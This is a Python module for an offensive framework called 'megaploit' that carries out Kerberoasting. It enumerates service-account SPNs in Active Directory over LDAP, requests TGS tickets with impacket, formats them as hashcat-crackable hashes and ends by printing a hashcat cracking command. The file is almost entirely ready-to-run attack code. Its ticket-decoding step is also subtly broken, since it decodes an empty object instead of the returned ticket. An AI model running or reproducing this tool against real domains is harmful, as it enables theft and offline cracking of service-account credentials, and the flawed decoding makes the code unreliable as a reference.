"""
megaploit.modules.auxiliary.kerberos_kerberoast
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Kerberoasting — request TGS tickets for all SPNs in the domain and capture
their hashes for offline cracking.

Attack flow
-----------
1.  Connect to AD via LDAP and enumerate all user accounts that have
    servicePrincipalName (SPN) attributes set.
2.  Request a Kerberos TGS for each SPN using the current user's TGT
    (via impacket's GetST or GetUserSPNs).
3.  Extract the RC4-encrypted ticket hash in $krb5tgs$ format (hashcat mode 13100).

Requirements
------------
    pip install impacket

References
----------
* https://attack.mitre.org/techniques/T1558/003/
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
* https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
"""

from __future__ import annotations

import socket
from concurrent.futures import ThreadPoolExecutor

from megaploit.modules.base import Module, ModuleType, OptionType


class KerberoastModule(Module):
    name        = "auxiliary/kerberos/kerberoast"
    description = (
        "Kerberoasting: enumerate SPNs via LDAP and request TGS tickets "
        "for offline NTLM/RC4 hash cracking"
    )
    module_type = ModuleType.AUXILIARY
    author      = "megaploit"
    references  = [
        "https://attack.mitre.org/techniques/T1558/003/",
        "https://github.com/SecureAuthCorp/impacket",
    ]
    platform    = ["windows", "multi"]; arch = []; rank = 400

    def _define_options(self) -> None:
        self._opt("RHOSTS",   OptionType.ADDRESS, required=True,
                  description="Domain controller IP or hostname")
        self._opt("DOMAIN",   OptionType.STRING,  required=True,
                  description="Active Directory domain (e.g. corp.local)")
        self._opt("USERNAME", OptionType.STRING,  required=True,
                  description="Domain user with LDAP read access")
        self._opt("PASSWORD", OptionType.STRING,  required=True,
                  description="Password for USERNAME")
        self._opt("OUTFILE",  OptionType.PATH,    required=False,
                  description="Write hashes to file (optional)")
        self._opt("TIMEOUT",  OptionType.INTEGER, default=30, required=False,
                  description="Request timeout in seconds")

    def check(self, session=None) -> str:
        self.validate()
        host    = str(self.get("RHOSTS"))
        timeout = int(self.get("TIMEOUT"))
        try:
            with socket.create_connection((host, 389), timeout=timeout):
                return f"[+] {host}:389 — LDAP port open, domain controller reachable"
        except OSError as e:
            return f"[-] {host}:389 — {e}"

    def run(self, session=None) -> list:
        self.validate()
        self.results.clear()

        dc       = str(self.get("RHOSTS"))
        domain   = str(self.get("DOMAIN"))
        username = str(self.get("USERNAME"))
        password = str(self.get("PASSWORD"))
        outfile  = self.get("OUTFILE") or ""
        timeout  = int(self.get("TIMEOUT"))

        self._emit(f"[*] Connecting to {dc} — domain={domain}")

        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import KerberosTime, Principal
            from impacket.ldap import ldap as _ldap
            from impacket.ldap import ldaptypes as _ldaptypes
        except ImportError:
            return [self._fail(
                "impacket not installed — run:  pip install impacket",
            )]

        # ── Step 1: LDAP SPN enumeration ────────────────────────────────
        spns: list[dict] = []
        try:
            ldap_url = f"ldap://{dc}"
            conn = _ldap.LDAPConnection(ldap_url, dstIp=dc)
            conn.login(username, password, domain)

            base_dn = ",".join(f"DC={p}" for p in domain.split("."))
            flt     = ("(&(objectClass=user)(servicePrincipalName=*)"
                       "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                       "(!(objectCategory=computer))")
            attrs   = ["sAMAccountName", "servicePrincipalName", "memberOf"]

            for entry in conn.search(base_dn, flt, attributes=attrs):
                if not hasattr(entry, "fields"):
                    continue
                sam  = str(entry["sAMAccountName"]) if "sAMAccountName" in entry else "?"
                for spn_raw in (entry.get("servicePrincipalName") or []):
                    spns.append({"sam": sam, "spn": str(spn_raw)})
                    self._emit(f"  [*] SPN found: {spn_raw}  ({sam})")
        except Exception as exc:
            return [self._fail(f"LDAP enumeration failed: {exc}", dc=dc)]

        if not spns:
            return [self._fail("No Kerberoastable accounts found", dc=dc)]

        self._emit(f"[*] Requesting TGS for {len(spns)} SPN(s)…")

        # ── Step 2: Request TGS for each SPN ────────────────────────────
        hashes: list[str] = []
        try:
            from impacket.krb5 import constants
            from impacket.krb5.asn1 import TGS_REP
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal

            user_principal = Principal(
                username, type=constants.PrincipalNameType.NT_PRINCIPAL.value
            )
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                user_principal, password, domain, lmhash=b"", nthash=b"",
                aesKey="", kdcHost=dc
            )

            for item in spns:
                spn = item["spn"]
                sam = item["sam"]
                try:
                    server_name = Principal(
                        spn, type=constants.PrincipalNameType.NT_SRV_INST.value
                    )
                    tgs, cipher2, old2, sess2 = getKerberosTGS(
                        server_name, domain, dc, tgt, cipher, sessionKey
                    )
                    # Format as hashcat-compatible $krb5tgs$
                    from impacket.krb5.asn1 import TGS_REP as _TGS_REP
                    from pyasn1.codec.ber import decoder as _ber
                    decoded = _ber.decode(_TGS_REP(), asn1Spec=_TGS_REP())[0]
                    enc_ticket = bytes(decoded["ticket"]["enc-part"]["cipher"])

                    # Build the hash string
                    hash_str = (
                        f"$krb5tgs$23$*{sam}${domain}${spn}$"
                        f"{enc_ticket[:16].hex()}${enc_ticket[16:].hex()}"
                    )
                    hashes.append(hash_str)
                    self._emit(f"  [+] Got TGS: {spn}")
                    self._ok(f"TGS for {spn}", sam=sam, spn=spn, hash=hash_str)
                except Exception as e:
                    self._fail(f"TGS request failed for {spn}: {e}", sam=sam)
        except Exception as exc:
            return [self._fail(f"TGT acquisition failed: {exc}")]

        # ── Step 3: Save hashes ─────────────────────────────────────────
        if hashes and outfile:
            try:
                import os
                os.makedirs(os.path.dirname(outfile) or ".", exist_ok=True)
                with open(outfile, "w") as f:
                    f.write("\n".join(hashes) + "\n")
                self._emit(f"[+] Hashes written to {outfile}")
            except OSError as e:
                self._emit(f"[-] Could not write to {outfile}: {e}")

        ok = sum(1 for r in self.results if r.ok)
        self._emit(f"[+] Done — {ok}/{len(spns)} TGS ticket(s) obtained")
        self._emit("    Crack with:  hashcat -m 13100 hashes.txt rockyou.txt")
        return self.results


MODULE = KerberoastModule
